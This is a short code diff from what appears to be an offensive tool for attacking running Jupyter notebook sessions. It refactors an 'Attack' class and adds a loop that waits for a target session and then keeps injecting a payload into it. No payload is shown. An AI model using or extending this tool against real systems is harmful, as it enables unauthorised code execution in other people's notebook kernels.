@@ -9,11 +9,8 @@ import time
 
 
 class Attack:
-    def __init__(self, host_or_connection, secret=None):
-        if isinstance(host_or_connection, (Connection, DumbConnection)):
-            self.connection = host_or_connection
-        else:
-            self.connection = Connection(host_or_connection, secret)
+    def __init__(self, connection: Connection):
+        self.connection = connection
 
     async def _recv_all(self, conn, timeout):
         while True:
@@ -125,11 +122,17 @@ class Attack:
         while True:
             try:
                 loop = asyncio.get_event_loop()
+                if not self.connection.jpy_sessions.get(target):
+                    self.connection.list_running_jpy_sessions()
+                    if not self.connection.jpy_sessions.get(target):
+                        time.sleep(frequency)
+                        continue
+
                 loop.run_until_complete(
                     self.attack_session(
                         target, payload_str, silent=True, print_out=False
                     )
                 )
                 time.sleep(frequency)
-            except:
-                pass
+            except Exception as e:
+                time.sleep(frequency)
